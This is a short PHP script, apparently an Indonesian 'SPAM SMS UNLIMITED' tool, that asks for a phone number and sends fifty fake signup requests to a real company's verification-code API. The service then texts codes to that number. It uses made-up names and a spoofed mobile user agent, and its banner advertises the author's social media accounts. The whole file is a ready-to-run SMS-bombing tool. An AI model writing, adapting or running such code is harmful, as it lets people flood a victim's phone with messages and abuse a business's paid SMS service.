<?php
function sms($no){
for ($i=1; $i <= 50; $i++) {
	$p = array("first_name" => "Baiwb", "last_name" => "Haihwh", "password" => "jsiwbw8wh76", "phone" => $no);
$post = json_encode($p);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.stoqo.com/signup/generate_code/");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_USERAGENT, "okhttp/3.12.0");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json; charset=UTF8'));
$exe = curl_exec($ch);
curl_close($ch);
$js = json_decode($exe);
if (!empty($js->nexmo_request_id)) {
	echo "SUKSES | FB: ImanuelTaroreh\n";
	}else{
	echo "GAGAL SILAHKAN COBA LAGI | IG: valdotaroreh19\n";
}
}
}
echo "+--------------------------------------+\n";
print "[+]SPAM SMS UNLIMITED\n";
print "[+]CREATED: MR.TVM4\n";
print "[+]MY SOSMED\n";
print "[+]FACEBOOK: ImanuelTaroreh\n";
print "[+]INSTAGRAM: valdotaroreh19\n";
print "[+]GITHUB: http://github.com/valdot\n";
echo "+--------------------------------------+\n";
echo "Nomor? (ex : 628*****)\nInput : ";
$nomor = trim(fgets(STDIN));
$execute = sms($nomor, $p);
print $execute;
print "Botnya Lelah Gan, Silahkan Ulang Lagi Yahh\n";
?>
